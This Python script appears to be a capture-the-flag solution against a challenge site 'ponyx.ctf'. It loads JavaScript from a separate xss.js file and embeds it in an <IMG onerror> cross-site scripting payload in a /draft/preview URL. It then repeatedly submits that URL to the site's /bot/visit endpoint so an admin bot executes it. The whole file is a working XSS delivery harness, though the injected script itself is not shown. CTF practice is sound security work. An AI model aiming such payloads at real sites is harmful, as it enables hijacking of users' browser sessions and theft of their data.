from urllib.parse import urljoin, urlencode

import requests

BASE_URL = 'http://ponyx.ctf/'

BOT_BASE_URL = 'http://localhost:5000/'

if __name__ == '__main__':
    while True:
        with open('xss.js', 'r') as xss_f:
            xss_js = xss_f.read().strip()

        # Remove comments and empty lines
        xss_js = '\n'.join([x.strip() for x in xss_js.splitlines() if x.strip() and not x.strip().startswith('//')])

        # Dictionary of parameters
        params = {"data": f"<IMG SRC=/ onerror=\"{xss_js}\"></img>"}

        # Generate the query string
        query_string = urlencode(params)

        # Construct the full URL
        full_url = f"{urljoin(BOT_BASE_URL, '/draft/preview')}?{query_string.replace('%7BBASE_URL%7D', BOT_BASE_URL)}%%"

        print(f"{urljoin(BASE_URL, '/draft/preview')}?{query_string.replace('%7BBASE_URL%7D', BASE_URL)}%%")

        parameters = {'url': full_url}
        respone = requests.post(urljoin(BASE_URL, '/bot/visit'), data=parameters)
        print(respone.status_code, respone.text)
